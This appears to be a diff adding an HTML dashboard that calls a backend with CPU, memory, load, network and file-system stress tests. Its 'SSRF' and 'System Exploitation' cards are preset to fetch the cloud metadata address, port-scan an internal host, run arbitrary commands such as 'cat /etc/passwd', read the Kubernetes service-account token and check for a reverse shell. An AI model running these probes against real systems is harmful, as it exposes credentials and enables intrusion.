@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔥 Intense Stress Test Suite</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { text-align: center; font-size: 2.5em; margin-bottom: 30px; text-shadow: 0 0 20px #ff6b6b; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
+        .card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); }
+        .card h2 { color: #4ecdc4; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; padding: 10px 20px; border-radius: 8px; color: white; cursor: pointer; margin: 5px; font-size: 14px; transition: all 0.3s; }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }
+        .btn.danger { background: linear-gradient(135deg, #f5576c 0%, #f093fb 100%); }
+        .btn.success { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); }
+        .btn.warning { background: linear-gradient(135deg, #f2994a 0%, #f2c94c 100%); }
+        .output { background: #0d1117; border-radius: 8px; padding: 15px; margin-top: 15px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+        .status { padding: 8px 15px; border-radius: 20px; display: inline-block; margin: 5px 0; }
+        .status.running { background: #f39c12; animation: pulse 1s infinite; }
+        .status.success { background: #27ae60; }
+        .status.error { background: #e74c3c; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
+        .stat { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; text-align: center; }
+        .stat-value { font-size: 2em; font-weight: bold; color: #4ecdc4; }
+        .stat-label { font-size: 0.8em; color: #888; }
+        input { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); padding: 8px 12px; border-radius: 5px; color: white; margin: 5px; width: 200px; }
+        .progress { height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; margin-top: 10px; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); width: 0%; transition: width 0.3s; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 Intense Stress Test Suite</h1>
+        
+        <div class="stats">
+            <div class="stat"><div class="stat-value" id="totalTests">0</div><div class="stat-label">Tests Run</div></div>
+            <div class="stat"><div class="stat-value" id="avgTime">0ms</div><div class="stat-label">Avg Response</div></div>
+            <div class="stat"><div class="stat-value" id="successRate">0%</div><div class="stat-label">Success Rate</div></div>
+            <div class="stat"><div class="stat-value" id="activeTests">0</div><div class="stat-label">Active Tests</div></div>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <h2>🔥 CPU Stress Tests</h2>
+                <button class="btn" onclick="runTest('/api/cpu/hash?iterations=100000')">Hash 100K</button>
+                <button class="btn danger" onclick="runTest('/api/cpu/hash?iterations=1000000')">Hash 1M</button>
+                <button class="btn" onclick="runTest('/api/cpu/prime?limit=100000')">Primes 100K</button>
+                <button class="btn danger" onclick="runTest('/api/cpu/prime?limit=500000')">Primes 500K</button>
+                <button class="btn warning" onclick="runTest('/api/cpu/fibonacci?n=40')">Fib(40)</button>
+                <button class="btn danger" onclick="runTest('/api/cpu/fibonacci?n=45')">Fib(45) ⚠️</button>
+                <div class="output" id="cpu-output">Ready...</div>
+            </div>
+
+            <div class="card">
+                <h2>💾 Memory Stress Tests</h2>
+                <button class="btn" onclick="runTest('/api/memory/allocate?size=50')">Alloc 50MB</button>
+                <button class="btn warning" onclick="runTest('/api/memory/allocate?size=200')">Alloc 200MB</button>
+                <button class="btn danger" onclick="runTest('/api/memory/allocate?size=500')">Alloc 500MB</button>
+                <button class="btn danger" onclick="runTest('/api/memory/leak?count=50000')">Leak 50K</button>
+                <div class="output" id="memory-output">Ready...</div>
+            </div>
+
+            <div class="card">
+                <h2>🌐 Network & SSRF Tests</h2>
+                <input type="text" id="ssrf-url" value="http://169.254.169.254/latest/meta-data/" placeholder="URL">
+                <button class="btn danger" onclick="runTest('/api/network/fetch?url=' + encodeURIComponent(document.getElementById('ssrf-url').value))">SSRF Fetch</button>
+                <button class="btn" onclick="runTest('/api/network/dns?host=kubernetes.default.svc.cluster.local')">K8s DNS</button>
+                <button class="btn warning" onclick="runTest('/api/network/scan?host=10.100.0.1')">Port Scan</button>
+                <div class="output" id="network-output">Ready...</div>
+            </div>
+
+            <div class="card">
+                <h2>🖥️ System Exploitation</h2>
+                <button class="btn success" onclick="runTest('/api/system/info')">Full System Info</button>
+                <button class="btn danger" onclick="runTest('/api/reverse/check')">Reverse Shell Check</button>
+                <input type="text" id="cmd" value="cat /etc/passwd" placeholder="Command">
+                <button class="btn danger" onclick="runTest('/api/system/exec?cmd=' + encodeURIComponent(document.getElementById('cmd').value))">Execute</button>
+                <div class="output" id="system-output">Ready...</div>
+            </div>
+
+            <div class="card">
+                <h2>📁 File System Tests</h2>
+                <button class="btn" onclick="runTest('/api/fs/write?size=10')">Write 10MB</button>
+                <button class="btn warning" onclick="runTest('/api/fs/write?size=100')">Write 100MB</button>
+                <input type="text" id="filepath" value="/etc/passwd" placeholder="File path">
+                <button class="btn" onclick="runTest('/api/fs/read?path=' + encodeURIComponent(document.getElementById('filepath').value))">Read File</button>
+                <button class="btn danger" onclick="runTest('/api/fs/read?path=/var/run/secrets/kubernetes.io/serviceaccount/token')">K8s Token</button>
+                <div class="output" id="fs-output">Ready...</div>
+            </div>
+
+            <div class="card">
+                <h2>⚡ Concurrent Load Tests</h2>
+                <button class="btn" onclick="runTest('/api/load/concurrent?count=100')">100 Concurrent</button>
+                <button class="btn warning" onclick="runTest('/api/load/concurrent?count=1000')">1000 Concurrent</button>
+                <button class="btn danger" onclick="stressTest(50)">50x Rapid Fire</button>
+                <button class="btn danger" onclick="stressTest(200)">200x Stress Test</button>
+                <div class="progress"><div class="progress-bar" id="load-progress"></div></div>
+                <div class="output" id="load-output">Ready...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let stats = { total: 0, success: 0, times: [], active: 0 };
+
+        function updateStats(time, success) {
+            stats.total++;
+            if (success) stats.success++;
+            stats.times.push(time);
+            if (stats.times.length > 100) stats.times.shift();
+            document.getElementById('totalTests').textContent = stats.total;
+            document.getElementById('avgTime').textContent = Math.round(stats.times.reduce((a,b) => a+b, 0) / stats.times.length) + 'ms';
+            document.getElementById('successRate').textContent = Math.round(stats.success / stats.total * 100) + '%';
+            document.getElementById('activeTests').textContent = stats.active;
+        }
+
+        async function runTest(endpoint) {
+            const category = endpoint.includes('cpu') ? 'cpu' : endpoint.includes('memory') ? 'memory' : endpoint.includes('network') ? 'network' : endpoint.includes('system') || endpoint.includes('reverse') ? 'system' : endpoint.includes('fs') ? 'fs' : 'load';
+            const output = document.getElementById(category + '-output');
+            output.innerHTML = '<span class="status running">Running...</span>';
+            stats.active++;
+            document.getElementById('activeTests').textContent = stats.active;
+            const start = Date.now();
+            try {
+                const res = await fetch(endpoint);
+                const data = await res.json();
+                const time = Date.now() - start;
+                output.innerHTML = '<span class="status success">Success (' + time + 'ms)</span>\n\n' + JSON.stringify(data, null, 2);
+                updateStats(time, true);
+            } catch (e) {
+                const time = Date.now() - start;
+                output.innerHTML = '<span class="status error">Error (' + time + 'ms)</span>\n\n' + e.message;
+                updateStats(time, false);
+            }
+            stats.active--;
+            document.getElementById('activeTests').textContent = stats.active;
+        }
+
+        async function stressTest(count) {
+            const output = document.getElementById('load-output');
+            const progress = document.getElementById('load-progress');
+            output.innerHTML = '<span class="status running">Running ' + count + ' requests...</span>';
+            const start = Date.now();
+            let completed = 0, successes = 0;
+            const promises = [];
+            for (let i = 0; i < count; i++) {
+                promises.push(fetch('/api/cpu/hash?iterations=10000').then(r => { successes++; return r; }).catch(() => {}).finally(() => { completed++; progress.style.width = (completed / count * 100) + '%'; }));
+            }
+            await Promise.all(promises);
+            const time = Date.now() - start;
+            output.innerHTML = '<span class="status success">Complete!</span>\n\nTotal: ' + count + ' requests\nSuccessful: ' + successes + '\nTime: ' + time + 'ms\nRPS: ' + Math.round(count / time * 1000);
+        }
+    </script>
+</body>
+</html>
